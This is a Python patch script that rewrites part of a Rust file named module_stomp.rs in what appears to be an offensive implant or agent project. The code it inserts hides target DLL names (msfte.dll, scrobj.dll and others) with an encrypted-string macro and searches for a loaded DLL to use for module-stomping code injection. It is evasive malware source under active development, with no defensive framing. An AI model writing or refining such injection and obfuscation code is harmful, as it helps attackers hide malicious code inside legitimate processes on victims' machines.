import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# Try to use a manual array without vec! macro
text = text.replace('''            // Hardcode strings to avoid borrow checker
            let candidates: Vec<&[u8]> = vec![
                b"msfte.dll\\0",
                b"msratelc.dll\\0",
                b"scrobj.dll\\0",
                b"amstream.dll\\0"
            ];''', '''
            // The strings dropped issue happens before this due to the array, fix it properly:
            let dll1 = enc_str!("msfte.dll");
            let dll2 = enc_str!("msratelc.dll");
            let dll3 = enc_str!("scrobj.dll");
            let dll4 = enc_str!("amstream.dll");
            
            let mut h_proc = std::ptr::null_mut();
            let mut target_base = 0 as *mut u8;
            let mut target_dll: &[u8] = &[];
            
            if let Ok((h, b)) = target_dll_search(&[dll1.as_ref()]) {
                h_proc = h; target_base = b; target_dll = dll1.as_ref();
            } else if let Ok((h, b)) = target_dll_search(&[dll2.as_ref()]) {
                h_proc = h; target_base = b; target_dll = dll2.as_ref();
            } else if let Ok((h, b)) = target_dll_search(&[dll3.as_ref()]) {
                h_proc = h; target_base = b; target_dll = dll3.as_ref();
            } else if let Ok((h, b)) = target_dll_search(&[dll4.as_ref()]) {
                h_proc = h; target_base = b; target_dll = dll4.as_ref();
            } else {
                return Err(anyhow::anyhow!("No target dll found"));
            }
''')

# Delete old match block
text = re.sub(r'''let \(mut h_proc, mut target_base\) = match target_dll_search\(&candidates\) \{
.*?
            \};''', '', text, flags=re.DOTALL)
text = re.sub(r'''let target_dll = &candidates\[0\];''', '', text, flags=re.DOTALL)

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

